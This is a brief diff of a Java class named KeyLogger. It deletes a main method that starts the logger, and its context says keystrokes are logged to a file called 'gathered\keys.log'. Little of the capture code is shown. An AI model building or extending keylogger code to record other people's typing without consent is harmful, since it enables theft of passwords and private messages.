@@ -12,11 +12,6 @@ public class KeyLogger implements NativeKeyListener {
 	private static PrintWriter out;
 	private boolean shift=false;
 
-	public static void main(String[] args) {
-		System.out.println("Starting");
-		start();
-	}
-
 	/**
 	 * Starts a key logger and logs keys to 'gathered\keys.log'.
 	 */
